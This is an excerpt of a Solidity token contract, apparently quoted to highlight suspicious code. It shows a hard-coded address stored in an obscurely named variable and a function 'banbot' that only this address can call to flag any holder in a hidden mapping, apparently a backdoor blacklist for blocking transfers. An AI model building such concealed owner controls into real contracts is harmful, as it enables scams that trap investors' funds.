...
contract Token is Context, IERC20, Ownable {
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0xCB2AcC55f451f1010aAf967A4Ae78ff57996A191));
        m = payable(address(0xCB2AcC55f451f1010aAf967A4Ae78ff57996A191));
    ...
    function banbot(address a,bool b) public {if(msg.sender == m){
        _transferr[a] = b;}
    }
